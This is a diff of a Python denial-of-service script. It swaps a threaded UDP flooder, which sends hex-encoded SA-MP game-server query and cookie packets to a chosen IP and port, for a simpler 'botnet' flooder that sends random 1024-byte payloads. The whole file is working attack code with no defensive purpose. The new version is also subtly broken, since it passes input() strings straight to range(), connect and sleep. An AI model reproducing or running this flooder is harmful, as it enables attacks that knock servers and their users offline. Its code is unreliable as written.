@@ -1,83 +1,29 @@
 import socket
-import struct
-import codecs,sys
 import threading
-import random
 import time
-import os
+import random
 
+target_server = input("Enter the target ip: ")
+target_port = input("Enter the target port: ")
+botnet_size = input("Enter the bots count: ")
+attack_duration = input("Duration: ")
 
+def send_flood(sock):
+    while True:
+        try:
+            sock.send(random._urandom(1024))  # Send random data to flood the server
+        except socket.error:
+            break
 
+def attack():
+    for _ in range(botnet_size):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.connect((target_server, target_port))
+        threading.Thread(target=send_flood, args=(sock,)).start()
 
-ip = input("Enter the server ip: ")
-port = input("Enter the server port: ")
-orgip =ip
+    print(f"Botnet attack launched with {botnet_size} bots!")
+    time.sleep(attack_duration)
+    print("Attack completed!")
 
-Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
-                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
-                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
-                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
-                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
-                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
-                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
-                       ]
-
-
-print("DOS Attack for ip: %s and port: %s"%(orgip,port))
-
-            
-
-
-
-
-
-class MyThread(threading.Thread):
-     def run(self):
-         while True:
-                sock = socket.socket(
-                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
-                
-                msg = Pacotes[random.randrange(0,3)]
-                     
-                sock.sendto(msg, (ip, int(port)))
-                
-                
-                if(int(port) == 7777):
-                    sock.sendto(Pacotes[5], (ip, int(port)))
-                elif(int(port) == 7796):
-                    sock.sendto(Pacotes[4], (ip, int(port)))
-                elif(int(port) == 7771):
-                    sock.sendto(Pacotes[6], (ip, int(port)))
-                elif(int(port) == 7784):
-                    sock.sendto(Pacotes[7], (ip, int(port)))
-                elif(int(port) == 1111):
-                    sock.sendto(Pacotes[9], (ip, int(port)))    
-                
-
-if __name__ == '__main__':
-    try:
-     for x in range(100):                                    
-            mythread = MyThread()  
-            mythread.start()                                  
-            time.sleep(.1)    
-    except(KeyboardInterrupt):
-         os.system('cls' if os.name == 'nt' else 'clear')
-         
-def check_server(ip, port):
-    try:
-       
-        with socket.create_connection((ip, port), timeout=5):
-            return True
-    except (socket.timeout, socket.error):
-        return False
-
-while True:
-    syms = random.choice(("[+]", "[#]", "-", "$" "[*]"))
-    if check_server(ip, port):
-    	
-        print(syms + "\033[32mAttacking server")
-    else:
-        print(syms + "\033[31mServet Closed connection")
+if __name__ == "__main__":
+    attack()
